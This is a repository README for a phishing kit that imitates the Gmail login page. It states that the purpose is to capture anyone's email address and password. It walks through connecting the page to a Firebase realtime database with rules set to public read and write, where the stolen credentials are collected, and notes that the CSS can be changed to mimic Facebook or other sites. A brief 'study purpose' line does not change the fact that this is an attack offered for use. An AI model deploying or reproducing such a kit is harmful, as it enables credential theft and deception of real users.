# phishingwithgmail
This repository can be used to do phishing  to acquire any Email and password.

### Instructions
<br> />
This repository use firebase and html. One can use this repo for study purpose. 
Just go to: <br />
index.html and place your firebase web app credentials for firebase credentials go [here](https://console.firebase.google.com/u/0/).<br />

1. Go to database and create database of your choice or directly go to realtime data base from top. <br />

2. Go to rules button in realtime database and replace false with true.<br />

`{
  /* Visit https://firebase.google.com/docs/database/security to learn more about security rules. */
  "rules": {
    ".read": true,
    ".write": true
  }
}`

3. You are all set.

You can check ID Password In realtime storage.
<br />
This repo look same like gmail login page.
for making it look like other login pages say facebook just change css. <br />
